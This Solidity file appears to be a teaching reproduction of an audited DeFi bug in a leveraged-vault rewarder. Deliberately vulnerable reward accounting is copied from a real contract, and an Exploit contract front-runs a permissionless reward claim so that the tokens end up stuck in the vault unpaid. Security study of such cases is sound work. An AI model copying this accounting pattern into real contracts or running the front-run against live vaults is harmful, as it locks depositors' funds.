// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Notional Leveraged Vaults — H-7 (Sherlock 2024-06, AuditVault 35120)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: _claimVaultRewards credits only the balance delta around
    _executeClaim. Aura getReward is permissionless, so a front-run delivers
    the reward tokens before the snapshot and the delta is zero. The tokens
    sit in the vault and are never paid to depositors.
    Vulnerable lines copied verbatim from VaultRewarderLib.sol (@> VULN). */

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IAuraRewardPool {
    function getReward(address _account, bool _claimExtras) external returns (bool);
}

interface IConvexRewardPool {
    function getReward(address _account, bool _claimExtras) external returns (bool);
}

interface IConvexRewardPoolArbitrum {
    function getReward(address _account) external;
}

contract RewardToken is IERC20 {
    string public name = "Aura Reward";
    string public symbol = "AURA";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// Aura BaseRewardPool.getReward: anyone may claim for any account.
/// The reward is paid to `_account`, not to msg.sender.
contract AuraRewardPool is IAuraRewardPool {
    RewardToken public rewardToken;
    mapping(address => uint256) public rewards;

    event RewardPaid(address indexed user, uint256 reward);

    constructor(RewardToken token) {
        rewardToken = token;
    }

    function setEarned(address account, uint256 amount) external {
        rewards[account] = amount;
    }

    function earned(address account) public view returns (uint256) {
        return rewards[account];
    }

    function getReward(address _account, bool _claimExtras) public returns (bool) {
        _claimExtras;
        uint256 reward = earned(_account);
        if (reward > 0) {
            rewards[_account] = 0;
            rewardToken.transfer(_account, reward);
            emit RewardPaid(_account, reward);
        }
        return true;
    }
}

contract VaultRewarder {
    enum RewardPoolType {
        AURA,
        CONVEX_MAINNET,
        CONVEX_ARBITRUM
    }

    struct RewardPoolStorage {
        RewardPoolType poolType;
        address rewardPool;
    }

    struct RewardState {
        address rewardToken;
    }

    RewardState[] public state;
    RewardPoolStorage public poolConfig;
    uint256 public totalVaultShares;
    mapping(uint256 => uint256) public accountedReward;
    uint256 public paidOut;

    constructor(address rewardToken, address rewardPool, uint256 shares) {
        state.push(RewardState({rewardToken: rewardToken}));
        poolConfig = RewardPoolStorage({poolType: RewardPoolType.AURA, rewardPool: rewardPool});
        totalVaultShares = shares;
    }

    function claimVaultRewards() external {
        _claimVaultRewards(poolConfig, totalVaultShares);
    }

    function _claimVaultRewards(RewardPoolStorage memory rewardPool, uint256 totalVaultSharesBefore) internal {
        uint256[] memory balancesBefore = new uint256[](state.length);
        // Run a generic call against the reward pool and then do a balance
        // before and after check.
        for (uint256 i; i < state.length; i++) {
            // Presumes that ETH will never be given out as a reward token.
            balancesBefore[i] = IERC20(state[i].rewardToken).balanceOf(address(this));
        }

        _executeClaim(rewardPool);

        for (uint256 i; i < state.length; i++) {
            uint256 balanceAfter = IERC20(state[i].rewardToken).balanceOf(address(this));
            _accumulateSecondaryRewardViaClaim(
                i,
                state[i],
                // @> VULN: front-running getReward makes this difference 0, so tokens already in the vault are never credited
                // balanceAfter should never be less than balanceBefore
                balanceAfter - balancesBefore[i],
                totalVaultSharesBefore
            );
        }
    }

    function _executeClaim(RewardPoolStorage memory r) internal {
        if (r.poolType == RewardPoolType.AURA) {
            require(IAuraRewardPool(r.rewardPool).getReward(address(this), true));
        } else if (r.poolType == RewardPoolType.CONVEX_MAINNET) {
            require(IConvexRewardPool(r.rewardPool).getReward(address(this), true));
        } else if (r.poolType == RewardPoolType.CONVEX_ARBITRUM) {
            IConvexRewardPoolArbitrum(r.rewardPool).getReward(address(this));
        } else {
            revert();
        }
    }

    function _accumulateSecondaryRewardViaClaim(
        uint256 index,
        RewardState memory,
        uint256 claimed,
        uint256
    ) internal {
        accountedReward[index] = claimed;
    }

    function payDepositors(address to) external {
        uint256 owed = accountedReward[0];
        paidOut = owed;
        if (owed != 0) {
            accountedReward[0] = 0;
            IERC20(state[0].rewardToken).transfer(to, owed);
        }
    }
}

contract Exploit {
    uint256 public constant REWARD = 1000e18;
    address public constant DEPOSITOR = 0x000000000000000000000000000000000000bEEF;

    RewardToken public reward; // CREATE nonce 1
    AuraRewardPool public pool; // CREATE nonce 2
    VaultRewarder public vault; // CREATE nonce 3

    uint256 public vaultBalanceAfter;
    uint256 public accountedAfter;
    uint256 public depositorPaid;

    constructor() {
        reward = new RewardToken();
        pool = new AuraRewardPool(reward);
        vault = new VaultRewarder(address(reward), address(pool), 1000e18);
        reward.mint(address(pool), REWARD);
        pool.setEarned(address(vault), REWARD);
    }

    function run() external {
        uint256 owed = pool.earned(address(vault));
        require(owed == REWARD, "pool owes the vault 1000");

        pool.getReward(address(vault), true);

        uint256 sitting = reward.balanceOf(address(vault));
        require(sitting == REWARD, "front-run delivered 1000");

        vault.claimVaultRewards();

        accountedAfter = vault.accountedReward(0);
        require(accountedAfter == 0, "claim credited 0");

        vault.payDepositors(DEPOSITOR);

        vaultBalanceAfter = reward.balanceOf(address(vault));
        depositorPaid = reward.balanceOf(DEPOSITOR);
        require(vaultBalanceAfter == REWARD, "1000 stuck in the vault");
        require(depositorPaid == 0, "depositor received 0");
    }
}
